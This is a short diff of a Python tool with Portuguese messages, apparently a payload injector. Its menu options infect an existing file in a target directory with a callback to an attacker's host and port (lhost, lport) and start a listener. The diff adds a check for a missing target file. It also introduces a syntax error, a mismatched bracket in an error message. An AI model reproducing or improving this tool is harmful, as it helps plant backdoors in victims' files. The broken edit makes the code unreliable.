@@ -41,7 +41,7 @@ def infect_existing_file(file_path, lhost, lport):
         subprocess.call(cmd)
         print(f"Arquivo {output_name} infectado com sucesso.")
     except Exception as e:
-        print(f"Erro ao infectar o arquivo: {str(e)}")
+        print(f"Erro ao infectar o arquivo: {str(e}")
 
 def main():
     local_ip = get_local_ip()
@@ -73,7 +73,10 @@ def main():
             start_listener(lhost, lport)
         elif option == "3":
             target_file = find_target_file(target_directory)
-            infect_existing_file(target_file, lhost, lport)
+            if target_file:
+                infect_existing_file(target_file, lhost, lport)
+            else:
+                print("Nenhum arquivo alvo encontrado no diretório especificado.")
         elif option == "4":
             print("Encerrando o programa.")
             break
